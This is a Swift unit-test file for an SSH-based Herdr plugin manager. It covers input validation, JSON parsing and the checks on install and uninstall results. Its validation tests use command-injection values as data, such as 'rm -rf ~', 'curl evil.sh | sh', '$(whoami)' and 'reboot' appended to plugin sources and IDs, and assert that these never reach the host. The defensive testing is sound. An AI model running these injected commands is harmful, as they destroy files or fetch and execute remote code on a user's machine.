import Foundation
import Testing
@testable import MultiSessionAIManager

/// Sources and ids are interpolated into a command line that runs on the user's
/// host, so validating them is a safety property, not tidiness.
@Suite struct HerdrPluginSourceValidationTests {

    @Test func ownerRepoAndOwnerRepoSubdirAreAccepted() {
        #expect(HerdrPluginManagement.isValidSource("smarzban/herdr-file-viewer"))
        #expect(HerdrPluginManagement.isValidSource("owner/repo/subdir"))
        #expect(HerdrPluginManagement.isValidSource("a-b.c/d_e-f"))
    }

    @Test func aSourceCarryingShellMetacharactersIsRefused() {
        // THE reason this function exists: the source lands in a command line
        // that runs on the user's machine.
        #expect(!HerdrPluginManagement.isValidSource("owner/repo; rm -rf ~"))
        #expect(!HerdrPluginManagement.isValidSource("owner/repo && curl evil.sh | sh"))
        #expect(!HerdrPluginManagement.isValidSource("owner/$(whoami)"))
        #expect(!HerdrPluginManagement.isValidSource("owner/`id`"))
        #expect(!HerdrPluginManagement.isValidSource("owner/repo with space"))
        #expect(!HerdrPluginManagement.isValidSource("owner/repo\nrm -rf ~"))
    }

    @Test func aMalformedSourceShapeIsRefused() {
        #expect(!HerdrPluginManagement.isValidSource("justrepo"))
        #expect(!HerdrPluginManagement.isValidSource("owner/"))
        #expect(!HerdrPluginManagement.isValidSource("/repo"))
        #expect(!HerdrPluginManagement.isValidSource("a/b/c/d"))
        #expect(!HerdrPluginManagement.isValidSource(""))
    }

    @Test func refsAreValidatedTheSameWay() {
        #expect(HerdrPluginManagement.isValidRef("v1.2.3"))
        #expect(HerdrPluginManagement.isValidRef("main"))
        #expect(HerdrPluginManagement.isValidRef("feature/thing"))
        #expect(!HerdrPluginManagement.isValidRef("main; reboot"))
        #expect(!HerdrPluginManagement.isValidRef(""))
    }

    @Test func pluginIDsAreValidatedForUninstall() {
        #expect(HerdrPluginManagement.isValidPluginID("herdr-file-viewer"))
        #expect(HerdrPluginManagement.isValidPluginID("example.layout"))
        #expect(!HerdrPluginManagement.isValidPluginID("thing; rm -rf ~"))
        #expect(!HerdrPluginManagement.isValidPluginID(""))
    }

    @Test func theInstallCommandAlwaysPassesYes() {
        // `herdr plugin install` refuses on a non-interactive stdin, which an
        // SSH exec channel always is.
        let command = HerdrPluginManagement.installCommand(source: "a/b", ref: nil)
        #expect(command.contains("--yes"))
        #expect(!command.contains("--ref"))
    }

    @Test func theActionInvokeCommandPutsTheActionBeforeThePluginFlag() {
        // Herdr 0.8.2's parser only accepts --plugin AFTER the positional
        // action id; the flag-first order its own --help suggests answers
        // "unknown option: <plugin>" (and exits 0).
        #expect(HerdrPluginManagement.invokeActionCommand(
            pluginID: "shadowfax.ferry", actionID: "install-keybindings"
        ) == "herdr plugin action invoke install-keybindings --plugin shadowfax.ferry")
    }

    @Test func theLogListCommandFiltersToThePlugin() {
        #expect(HerdrPluginManagement.logListCommand(pluginID: "shadowfax.ferry")
                == "herdr plugin log list --plugin shadowfax.ferry")
    }

    @Test func aRefReachesTheInstallCommand() {
        let command = HerdrPluginManagement.installCommand(source: "a/b", ref: "v2")
        #expect(command.contains("--ref v2"))
    }
}

@Suite struct HerdrPluginListParsingTests {

    private let sample = """
    {"id":"cli:plugin","result":{"plugins":[
      {"plugin_id":"herdr-file-viewer","name":"herdr-file-viewer","version":"1.16.0",
       "description":"A git-aware file viewer.","enabled":true,
       "source":{"kind":"github","owner":"smarzban","repo":"herdr-file-viewer","resolved_commit":"647f0323"}},
      {"plugin_id":"example.layout","name":"Layout","version":"0.1.0",
       "description":"","enabled":false,"source":null}
    ]}}
    """

    @Test func pluginsAreReadOutOfTheCLIsJSON() throws {
        let plugins = try HerdrPluginManagement.parseList(sample)
        #expect(plugins.count == 2)
        #expect(plugins[0].pluginID == "herdr-file-viewer")
        #expect(plugins[0].version == "1.16.0")
        #expect(plugins[0].enabled)
        #expect(!plugins[1].enabled)
    }

    @Test func theOriginRepositoryIsRecoveredFromTheSource() throws {
        // So the list can say where a plugin came from, and so an install can be
        // verified against what the user asked for.
        let plugins = try HerdrPluginManagement.parseList(sample)
        #expect(plugins[0].originRepository == "smarzban/herdr-file-viewer")
        #expect(plugins[1].originRepository == nil)
    }

    @Test func shellNoiseBeforeTheJSONIsTolerated() throws {
        // The command runs through a shell that may print anything first.
        let noisy = "Welcome to Ubuntu 24.04\n\(sample)"
        #expect(try HerdrPluginManagement.parseList(noisy).count == 2)
    }

    @Test func aPluginWithNoEnabledKeyCountsAsEnabled() throws {
        // The key records a deliberate DISABLE; absence is not "off".
        let json = """
        {"result":{"plugins":[{"plugin_id":"p","name":"p","version":"1"}]}}
        """
        #expect(try HerdrPluginManagement.parseList(json).first?.enabled == true)
    }

    @Test func actionsAreReadOutOfTheCLIsJSON() throws {
        // Ferry-shaped: one plain action, one restricted to a pane context.
        let json = """
        {"result":{"plugins":[
          {"plugin_id":"shadowfax.ferry","name":"Herdr Ferry","version":"0.2.0","enabled":true,
           "actions":[
             {"id":"install-keybindings","title":"Install Ferry keybinding",
              "description":"Bind prefix+m to open Ferry."},
             {"id":"open","title":"Open Ferry","contexts":["pane"],
              "description":"Move panes or tabs."}
           ]}
        ]}}
        """
        let plugin = try #require(try HerdrPluginManagement.parseList(json).first)
        #expect(plugin.actions.count == 2)
        #expect(plugin.actions.first?.id == "install-keybindings")
        #expect(plugin.actions.first?.title == "Install Ferry keybinding")
        #expect(plugin.actions.first?.contexts.isEmpty == true)
        #expect(plugin.actions.last?.contexts == ["pane"])
    }

    @Test func aPluginWithNoActionsListsNone() throws {
        #expect(try HerdrPluginManagement.parseList(sample).first?.actions.isEmpty == true)
    }

    @Test func unreadableOutputThrowsRatherThanReportingNoPlugins() {
        // "No plugins installed" is a very different statement from "I could not
        // read the answer", and the UI acts on it.
        #expect(throws: HerdrPluginManagement.Failure.self) {
            try HerdrPluginManagement.parseList("herdr: command not found")
        }
        #expect(throws: HerdrPluginManagement.Failure.self) {
            try HerdrPluginManagement.parseList("{\"result\":{}}")
        }
    }
}

@Suite struct HerdrPluginActionDetectionTests {

    private func plugin(actions: [PluginAction]) -> InstalledPlugin {
        InstalledPlugin(pluginID: "p", name: "P", version: "1", description: "",
                        enabled: true, originRepository: nil, actions: actions)
    }

    @Test func anActionSayingKeybindInItsIdOrTitleIsAnInstaller() {
        // Ferry's real shape: id "install-keybindings", title "Install Ferry
        // keybinding". Herdr's own menu says "keybinds", so the match is the
        // stem, case-insensitive.
        let byID = PluginAction(id: "install-keybindings", title: "Set up",
                                description: "", contexts: [])
        let byTitle = PluginAction(id: "setup", title: "Install Keybinding",
                                   description: "", contexts: [])
        let unrelated = PluginAction(id: "open", title: "Open Ferry",
                                     description: "", contexts: [])
        let found = plugin(actions: [byID, byTitle, unrelated]).keybindingInstallers
        #expect(found == [byID, byTitle])
    }

    @Test func aContextualActionIsNeverOfferedAsAButton() {
        // contexts:["pane"] means "invoke me from a pane". The manager sheet
        // has no pane, so even a keybinding-named one stays off the row.
        let contextual = PluginAction(id: "keybinding-menu", title: "Keybindings",
                                      description: "", contexts: ["pane"])
        #expect(plugin(actions: [contextual]).keybindingInstallers.isEmpty)
    }
}

@Suite @MainActor struct HerdrPluginManagementOperationTests {

    private func stub(_ transport: FakeSSHTransport, _ outputs: [String]) {
        transport.structuredCommandResults = outputs.map { output in
            .success(SSHCommandResult(exitStatus: 0, stdout: Data(output.utf8), stderr: Data()))
        }
    }

    private func listJSON(_ ids: [String]) -> String {
        let entries = ids.map {
            "{\"plugin_id\":\"\($0)\",\"name\":\"\($0)\",\"version\":\"1\",\"enabled\":true,\"source\":{\"kind\":\"github\",\"owner\":\"owner\",\"repo\":\"\($0)\"}}"
        }.joined(separator: ",")
        return "{\"result\":{\"plugins\":[\(entries)]}}"
    }

    private func makeService() async throws -> (SSHService, FakeSSHTransport) {
        let host = Host(name: "h", address: "10.0.0.1", port: 22,
                        username: "alice", keyID: "k", defaultWorkdir: "/home/alice")
        let transport = FakeSSHTransport()
        let knownHosts = KnownHostsStore(defaults: UserDefaults(suiteName: "msam.pm.\(UUID())")!)
        let service = SSHService(host: host, transport: transport, knownHosts: knownHosts)
        try await service.connect(key: SSHKeyMaterial(ed25519Seed: Data(repeating: 4, count: 32))) { _, _ in true }
        return (service, transport)
    }

    @Test func installVerifiesByListingRatherThanExitStatus() async throws {
        // before, install, after
        let (service, transport) = try await makeService()
        stub(transport, [listJSON([]), "installed", listJSON(["thing"])])

        let plugins = try await HerdrPluginManagement.install(source: "owner/thing", using: service)

        #expect(plugins.map(\.pluginID) == ["thing"])
    }

    @Test func anInstallThatChangesNothingIsAFailureNotASuccess() async throws {
        // Citadel does not surface a remote exit status reliably, so a silent
        // no-op would otherwise report success and leave the user confused.
        let (service, transport) = try await makeService()
        stub(transport, [listJSON(["other"]), "error: no matching release", listJSON(["other"])])

        await #expect(throws: HerdrPluginManagement.Failure.self) {
            try await HerdrPluginManagement.install(source: "owner/thing", using: service)
        }
    }

    @Test func aHostileSourceNeverReachesTheHost() async throws {
        let (service, transport) = try await makeService()

        await #expect(throws: HerdrPluginManagement.Failure.invalidSource("owner/repo; rm -rf ~")) {
            try await HerdrPluginManagement.install(source: "owner/repo; rm -rf ~", using: service)
        }
        #expect(transport.commandsRun.isEmpty)
    }

    private func ackJSON(logID: String) -> String {
        """
        {"id":"cli:plugin","result":{"action":{"action_id":"install-keybindings",\
        "plugin_id":"shadowfax.ferry","title":"Install Ferry keybinding"},\
        "log":{"action_id":"install-keybindings","log_id":"\(logID)",\
        "plugin_id":"shadowfax.ferry","status":"running"},\
        "type":"plugin_action_invoked"}}
        """
    }

    private func logListJSON(logID: String, status: String,
                             stdout: String = "", stderr: String = "") -> String {
        """
        {"id":"cli:plugin","result":{"logs":[{"action_id":"install-keybindings",\
        "exit_code":0,"log_id":"\(logID)","plugin_id":"shadowfax.ferry",\
        "status":"\(status)","stderr":"\(stderr)","stdout":"\(stdout)"}],\
        "type":"plugin_log_list"}}
        """
    }

    @Test func invokingAnActionChecksThePluginLogForTheVerdict() async throws {
        // The invoke's stdout is only a "started" ack; the action runs async
        // and its outcome lands in the plugin log.
        let (service, transport) = try await makeService()
        stub(transport, [ackJSON(logID: "plugin-log-4"),
                         logListJSON(logID: "plugin-log-4", status: "succeeded",
                                     stdout: "bound prefix+m")])
        let answer = try await HerdrPluginManagement.invokeAction(
            pluginID: "shadowfax.ferry", actionID: "install-keybindings", using: service)
        #expect(answer.contains("bound prefix+m"))
        #expect(transport.commandsRun.contains {
            $0.contains("herdr plugin action invoke install-keybindings --plugin shadowfax.ferry")
        })
        #expect(transport.commandsRun.contains { $0.contains("plugin log list") })
    }

    @Test func aSilentSuccessfulActionStillReadsAsDone() async throws {
        // Ferry's installer succeeds with empty stdout and stderr.
        let (service, transport) = try await makeService()
        stub(transport, [ackJSON(logID: "plugin-log-4"),
                         logListJSON(logID: "plugin-log-4", status: "succeeded")])
        let answer = try await HerdrPluginManagement.invokeAction(
            pluginID: "shadowfax.ferry", actionID: "install-keybindings", using: service)
        #expect(answer.localizedCaseInsensitiveContains("done"))
    }

    @Test func aCLITextReplyLikeUnknownOptionIsAFailureNotANotice() async throws {
        // "unknown option: shadowfax.ferry" came back as a SUCCESS notice with
        // a green check. Text instead of an ack means the CLI refused.
        let (service, transport) = try await makeService()
        stub(transport, ["unknown option: shadowfax.ferry\n"])
        await #expect(throws: HerdrPluginManagement.Failure.self) {
            _ = try await HerdrPluginManagement.invokeAction(
                pluginID: "shadowfax.ferry", actionID: "install-keybindings", using: service)
        }
    }

    @Test func aFailedActionReportsItsStderr() async throws {
        let (service, transport) = try await makeService()
        stub(transport, [ackJSON(logID: "plugin-log-9"),
                         logListJSON(logID: "plugin-log-9", status: "failed",
                                     stderr: "cargo: command not found")])
        do {
            _ = try await HerdrPluginManagement.invokeAction(
                pluginID: "shadowfax.ferry", actionID: "install-keybindings", using: service)
            Issue.record("a failed action must throw")
        } catch let failure as HerdrPluginManagement.Failure {
            guard case .actionFailed(let reason) = failure else {
                Issue.record("wrong failure: \(failure)")
                return
            }
            #expect(reason.contains("cargo: command not found"))
        }
    }

    @Test func aHostileActionIDNeverReachesTheHost() async throws {
        // Action ids come from a third-party manifest; they are user data.
        let (service, transport) = try await makeService()
        await #expect(throws: HerdrPluginManagement.Failure.self) {
            _ = try await HerdrPluginManagement.invokeAction(
                pluginID: "shadowfax.ferry", actionID: "x; rm -rf ~", using: service)
        }
        #expect(!transport.commandsRun.contains { $0.contains("action invoke") })
    }

    @Test func uninstallVerifiesThePluginIsActuallyGone() async throws {
        let (service, transport) = try await makeService()
        stub(transport, ["removed", listJSON(["other"])])

        let plugins = try await HerdrPluginManagement.uninstall(pluginID: "thing", using: service)

        #expect(!plugins.contains { $0.pluginID == "thing" })
    }

    @Test func anUninstallThatLeavesThePluginInPlaceFails() async throws {
        let (service, transport) = try await makeService()
        stub(transport, ["removed", listJSON(["thing"])])

        await #expect(throws: HerdrPluginManagement.Failure.self) {
            try await HerdrPluginManagement.uninstall(pluginID: "thing", using: service)
        }
    }
}

/// A fake catalogue so the manager's flow is testable without touching GitHub.
private final class StubCatalogue: PluginCatalogueFetching, @unchecked Sendable {
    var results: [CataloguePlugin] = []
    var searchError: Error?
    var manifestByRepo: [String: Bool] = [:]
    var manifestError: Error?
    private(set) var manifestChecks: [String] = []

    func search(_ query: String) async throws -> [CataloguePlugin] {
        if let searchError { throw searchError }
        return results
    }

    func hasManifest(_ fullName: String) async throws -> Bool {
        manifestChecks.append(fullName)
        if let manifestError { throw manifestError }
        return manifestByRepo[fullName] ?? false
    }
}

@Suite @MainActor struct HerdrPluginManagerModelTests {

    private func makeModel(
        _ catalogue: StubCatalogue,
        transport: FakeSSHTransport = FakeSSHTransport()
    ) -> (HerdrPluginManagerModel, FakeSSHTransport) {
        let keyStore = KeyStore(backing: InMemoryKeychain())
        let keyID = (try? keyStore.generateEd25519(label: "plugins")) ?? "k"
        let connection = HostConnection(
            host: Host(name: "h", address: "10.0.0.1", username: "alice",
                       keyID: keyID, defaultWorkdir: "/home/alice"),
            keyStore: keyStore,
            knownHosts: KnownHostsStore(defaults: UserDefaults(suiteName: "msam.pmm.\(UUID())")!),
            transport: transport
        )
        return (HerdrPluginManagerModel(connection: connection, catalogue: catalogue), transport)
    }

    @Test func updatingHerdrWhileDisconnectedExplainsItself() async {
        let (model, transport) = makeModel(StubCatalogue())
        await model.updateHerdr()
        #expect(model.errorMessage == "Not connected to this host.")
        #expect(!transport.commandsRun.contains { $0.contains("herdr update") })
    }

    @Test func installingAKeybindingWhileDisconnectedExplainsItself() async {
        let (model, transport) = makeModel(StubCatalogue())
        let action = PluginAction(id: "install-keybindings", title: "Install Ferry keybinding",
                                  description: "", contexts: [])
        let ferry = InstalledPlugin(pluginID: "shadowfax.ferry", name: "Herdr Ferry",
                                    version: "0.2.0", description: "", enabled: true,
                                    originRepository: nil, actions: [action])
        await model.installKeybinding(action, for: ferry)
        #expect(model.errorMessage == "Not connected to this host.")
        #expect(!transport.commandsRun.contains { $0.contains("action invoke") })
    }

    @Test func aRepoWithoutAManifestIsRefusedBeforeAnyInstallRuns() async {
        // The herdr-plugin topic is SELF-APPLIED, and plenty of repositories
        // wearing it are not plugins. Installing one would fail on the host
        // after a long wait; refusing early explains why instead.
        let catalogue = StubCatalogue()
        catalogue.manifestByRepo["someone/not-a-plugin"] = false
        let (model, transport) = makeModel(catalogue)

        await model.verifyThenInstall(
            CataloguePlugin(fullName: "someone/not-a-plugin", description: "", stars: 9000, htmlURL: nil)
        )

        #expect(model.errorMessage?.contains("herdr-plugin.toml") == true)
        #expect(!transport.commandsRun.contains { $0.contains("plugin install") })
    }

    @Test func theManifestIsCheckedOnlyForTheRowTheUserPicked() async {
        // Never for the whole page: unauthenticated GitHub allows about ten
        // requests a minute, and a page of results would spend that at once.
        let catalogue = StubCatalogue()
        catalogue.results = (1...20).map {
            CataloguePlugin(fullName: "owner/repo\($0)", description: "", stars: $0, htmlURL: nil)
        }
        let (model, _) = makeModel(catalogue)

        await model.search("")

        #expect(model.results.count == 20)
        #expect(catalogue.manifestChecks.isEmpty)
    }

    @Test func aRateLimitedPreCheckDoesNotBlockTheInstall() async {
        // Verification is a courtesy; `herdr plugin install` fails safely on its
        // own. Refusing to install because GitHub was busy would be worse.
        let catalogue = StubCatalogue()
        catalogue.manifestError = PluginCatalogueError.rateLimited
        let (model, _) = makeModel(catalogue)

        await model.verifyThenInstall(
            CataloguePlugin(fullName: "owner/thing", description: "", stars: 1, htmlURL: nil)
        )

        #expect(model.noticeMessage?.contains("pre-check") == true)
        // It got as far as trying, rather than stopping at the pre-check.
        #expect(model.errorMessage?.contains("herdr-plugin.toml") != true)
    }

    @Test func aRateLimitedSearchSaysSoRatherThanShowingAnEmptyCatalogue() async {
        let catalogue = StubCatalogue()
        catalogue.searchError = PluginCatalogueError.rateLimited
        let (model, _) = makeModel(catalogue)

        await model.search("")

        #expect(model.catalogueState == .failed(
            "GitHub is rate-limiting the catalogue. Wait a minute and try again."
        ))
        #expect(model.results.isEmpty)
    }

    @Test func aHostileTypedSourceIsRejectedInTheUILayerToo() async {
        let (model, transport) = makeModel(StubCatalogue())

        await model.install(source: "owner/repo; rm -rf ~", ref: nil)

        #expect(model.errorMessage?.contains("owner/repo") == true)
        #expect(transport.commandsRun.isEmpty)
    }

    @Test func anAlreadyInstalledCatalogueEntryIsRecognisedByItsOrigin() throws {
        let (model, _) = makeModel(StubCatalogue())
        // Matching on the source's owner/repo is what lets a browsed row say
        // "Installed" instead of offering a duplicate install.
        let plugins = try HerdrPluginManagement.parseList(
            "{\"result\":{\"plugins\":[{\"plugin_id\":\"fv\",\"name\":\"fv\",\"source\":{\"kind\":\"github\",\"owner\":\"smarzban\",\"repo\":\"herdr-file-viewer\"}}]}}"
        )
        #expect(plugins.first?.originRepository == "smarzban/herdr-file-viewer")
        #expect(!model.isInstalled("smarzban/herdr-file-viewer"))  // nothing loaded yet
    }
}

/// Installing a plugin reported failure for an install that worked — the same
/// mistake the Herdr installer made, in a second place.
@Suite @MainActor struct HerdrPluginAmbiguousDisconnectTests {

    private func stub(_ transport: FakeSSHTransport,
                      _ outcomes: [Result<String, SSHCommandExecutionError>]) {
        transport.structuredCommandResults = outcomes.map { outcome in
            outcome.map { SSHCommandResult(exitStatus: 0, stdout: Data($0.utf8), stderr: Data()) }
        }
    }

    private func listJSON(_ ids: [String]) -> String {
        let entries = ids.map {
            "{\"plugin_id\":\"\($0)\",\"name\":\"\($0)\",\"version\":\"1\",\"enabled\":true,\"source\":{\"kind\":\"github\",\"owner\":\"owner\",\"repo\":\"\($0)\"}}"
        }.joined(separator: ",")
        return "{\"result\":{\"plugins\":[\(entries)]}}"
    }

    private func makeService() async throws -> (SSHService, FakeSSHTransport) {
        let host = Host(name: "h", address: "10.0.0.1", port: 22,
                        username: "alice", keyID: "k", defaultWorkdir: "/home/alice")
        let transport = FakeSSHTransport()
        let service = SSHService(
            host: host, transport: transport,
            knownHosts: KnownHostsStore(defaults: UserDefaults(suiteName: "msam.pa.\(UUID())")!)
        )
        try await service.connect(key: SSHKeyMaterial(ed25519Seed: Data(repeating: 2, count: 32))) { _, _ in true }
        return (service, transport)
    }

    @Test func anAmbiguousDisconnectStillVerifiesWhatLandedOnTheHost() async throws {
        // A plugin install downloads a prebuilt and can fall back to a cargo
        // build, so it runs for minutes; over a slow link the channel can close
        // before Citadel sees a clean finish while the install completed.
        let (service, transport) = try await makeService()
        stub(transport, [
            .success(listJSON([])),                 // before
            .failure(.ambiguousDisconnect),         // install: channel died
            .success(listJSON(["thing"]))           // after: it landed anyway
        ])

        let plugins = try await HerdrPluginManagement.install(source: "owner/thing", using: service)

        #expect(plugins.map(\.pluginID) == ["thing"])
    }

    @Test func reinstallingAnExistingPluginIsNotReadAsFailure() async throws {
        // `herdr plugin install` REPLACES an existing plugin, so the count does
        // not grow. Counting alone would call a successful reinstall a failure.
        let (service, transport) = try await makeService()
        stub(transport, [
            .success(listJSON(["thing"])),          // before: already there
            .success("replaces: ..."),              // install
            .success(listJSON(["thing"]))           // after: same count
        ])

        let plugins = try await HerdrPluginManagement.install(source: "owner/thing", using: service)

        #expect(plugins.map(\.pluginID) == ["thing"])
    }

    @Test func aGenuinelyFailedInstallStillReportsTheInstallError() async throws {
        let (service, transport) = try await makeService()
        stub(transport, [
            .success(listJSON([])),
            .failure(.ambiguousDisconnect),
            .success(listJSON([]))                  // nothing landed
        ])

        await #expect(throws: HerdrPluginManagement.Failure.self) {
            try await HerdrPluginManagement.install(source: "owner/thing", using: service)
        }
    }

    @Test func anAmbiguousUninstallVerifiesAbsenceRatherThanReportingFailure() async throws {
        let (service, transport) = try await makeService()
        stub(transport, [
            .failure(.ambiguousDisconnect),         // uninstall: channel died
            .success(listJSON([]))                  // it is gone
        ])

        let plugins = try await HerdrPluginManagement.uninstall(pluginID: "thing", using: service)

        #expect(plugins.isEmpty)
    }
}


/// The CLI reports `source` as an OBJECT. Parsing it as a string left every
/// plugin with no origin, so nothing was ever recognised as already installed
/// and every reinstall reported failure. These fixtures are copied from a real
/// `herdr plugin list --json`, which is the point — the previous tests passed
/// against an invented string shape.
@Suite struct HerdrPluginSourceShapeTests {

    @Test func theOriginIsReadFromTheSourceOBJECT() {
        let source: [String: Any] = [
            "kind": "github",
            "owner": "smarzban",
            "repo": "herdr-file-viewer",
            "resolved_commit": "647f03236d9aa20de0b07c9de0a951e13a1e59bf",
            "managed_path": "/home/alice/.config/herdr/plugins/github/herdr-file-viewer-c993314e2614"
        ]
        #expect(HerdrPluginManagement.originRepository(from: source) == "smarzban/herdr-file-viewer")
    }

    @Test func aStringSourceIsStillAccepted() {
        // Tolerated so a different or older shape does not silently read as
        // "unknown origin" — the failure mode this whole bug was.
        #expect(HerdrPluginManagement.originRepository(from: "github:owner/repo@abc") == "owner/repo")
    }

    @Test func aLocallyLinkedPluginHasNoOrigin() {
        #expect(HerdrPluginManagement.originRepository(from: nil) == nil)
        #expect(HerdrPluginManagement.originRepository(from: ["kind": "local"]) == nil)
    }

    @Test func aRealCLIRecordParsesWithItsOrigin() throws {
        // Trimmed from actual output of `herdr plugin list --json` on a host.
        let json = """
        {"id":"cli:plugin","result":{"plugins":[{
          "description":"A git-aware, read-only file viewer.",
          "enabled":true,
          "name":"herdr-file-viewer",
          "plugin_id":"herdr-file-viewer",
          "version":"1.16.0",
          "source":{"installed_unix_ms":1787555117343,"kind":"github",
                    "owner":"smarzban","repo":"herdr-file-viewer",
                    "resolved_commit":"647f03236d9aa20de0b07c9de0a951e13a1e59bf"}
        }],"type":"plugin_list"}}
        """
        let plugin = try #require(try HerdrPluginManagement.parseList(json).first)
        #expect(plugin.pluginID == "herdr-file-viewer")
        #expect(plugin.version == "1.16.0")
        #expect(plugin.originRepository == "smarzban/herdr-file-viewer")
    }

    @Test func anAlreadyInstalledPluginIsRecognisedSoAReinstallSucceeds() throws {
        // The actual user-visible bug: reinstalling reported failure because the
        // count did not grow AND the origin never matched.
        let json = """
        {"result":{"plugins":[{"plugin_id":"fv","name":"fv",
          "source":{"kind":"github","owner":"smarzban","repo":"herdr-file-viewer"}}]}}
        """
        let installed = try HerdrPluginManagement.parseList(json)
        let wanted = HerdrPluginManagement.repositoryComponent(of: "smarzban/herdr-file-viewer")
        #expect(installed.contains { $0.originRepository?.lowercased() == wanted.lowercased() })
    }
}

/// The dedicated file-viewer setup card is gone — installing plugins belongs to
/// one place. The wiring that only makes sense for THAT plugin now lives on its
/// installed row.
@Suite @MainActor struct HerdrPluginFileTransferRowTests {

    private func model() -> HerdrPluginManagerModel {
        let keyStore = KeyStore(backing: InMemoryKeychain())
        let keyID = (try? keyStore.generateEd25519(label: "ft")) ?? "k"
        return HerdrPluginManagerModel(connection: HostConnection(
            host: Host(name: "h", address: "10.0.0.1", username: "alice",
                       keyID: keyID, defaultWorkdir: "/home/alice"),
            keyStore: keyStore,
            knownHosts: KnownHostsStore(defaults: UserDefaults(suiteName: "msam.ft.\(UUID())")!),
            transport: FakeSSHTransport()
        ))
    }

    private func plugin(id: String, origin: String?) -> InstalledPlugin {
        InstalledPlugin(pluginID: id, name: id, version: "1", description: "",
                        enabled: true, originRepository: origin)
    }

    @Test func theFileViewerIsRecognisedByItsOrigin() {
        #expect(model().isFileViewer(plugin(id: "x", origin: "smarzban/herdr-file-viewer")))
    }

    @Test func itIsAlsoRecognisedByPluginIDWhenTheOriginIsMissing() {
        // A locally linked copy has no origin, but is still the plugin whose
        // `open` command this wires up.
        #expect(model().isFileViewer(plugin(id: "herdr-file-viewer", origin: nil)))
    }

    @Test func anUnrelatedPluginGetsNoFileTransferAction() {
        // Offering it on every row would imply the app can wire up plugins it
        // knows nothing about.
        #expect(!model().isFileViewer(plugin(id: "other", origin: "someone/other")))
    }
}

/// `herdr plugin install` explains its failures clearly; the app was discarding
/// that and showing "the plugin did not appear", which the user cannot act on.
@Suite struct HerdrPluginInstallFailureReportingTests {

    /// Real output from `herdr plugin install shadowfax92/herdr-ferry --yes`
    /// on a host with no Rust toolchain. Note it exited ZERO while failing.
    private let ferryOutput = """
    Plugin install preview:
      id: shadowfax.ferry
      name: Herdr Ferry
      build commands: 1
        build: cargo build --release --locked
    error: plugin build failed
      plugin: shadowfax.ferry
      build: 1/1
      command: cargo build --release --locked
      error: failed to start: No such file or directory (os error 2)

    Plugin was not installed.
    """

    @Test func aMissingBuildToolchainIsRecognised() {
        // The remedy — install the toolchain on the HOST — is not something a
        // user could guess from raw installer output.
        #expect(HerdrPluginManagement.missingBuildTool(in: ferryOutput) == "cargo")
    }

    @Test func otherToolchainsAreRecognisedToo() {
        let output = """
        error: plugin build failed
          command: go build ./...
          error: failed to start: No such file or directory (os error 2)
        """
        #expect(HerdrPluginManagement.missingBuildTool(in: output) == "go")
    }

    @Test func anUnrelatedFailureIsNotMisreportedAsAMissingToolchain() {
        // Claiming "install cargo" for a checksum mismatch would send the user
        // somewhere useless.
        let output = "error: checksum mismatch for downloaded asset"
        #expect(HerdrPluginManagement.missingBuildTool(in: output) == nil)
    }

    @Test func aSuccessfulInstallIsNeverReadAsAMissingToolchain() {
        #expect(HerdrPluginManagement.missingBuildTool(in: "Installed herdr-file-viewer.") == nil)
    }

    @Test func theTailKeepsTheLinesThatSayWhy() {
        // Installer output leads with a preview banner; the reason is at the end.
        let tail = HerdrPluginManagement.tail(of: ferryOutput, lines: 3, fallback: "x")
        #expect(tail.contains("Plugin was not installed."))
        #expect(!tail.contains("Plugin install preview:"))
    }

    @Test func anEmptyOutputFallsBackRatherThanShowingNothing() {
        #expect(HerdrPluginManagement.tail(of: "   \n\n", fallback: "no reason given") == "no reason given")
    }

    @Test func theToolchainMessageNamesBothThePluginAndTheTool() async {
        let message = await HerdrPluginManagerModel.message(
            for: HerdrPluginManagement.Failure.buildToolchainMissing(
                tool: "cargo", plugin: "shadowfax92/herdr-ferry"
            )
        )
        #expect(message.contains("cargo"))
        #expect(message.contains("shadowfax92/herdr-ferry"))
        #expect(message.localizedCaseInsensitiveContains("install"))
    }
}
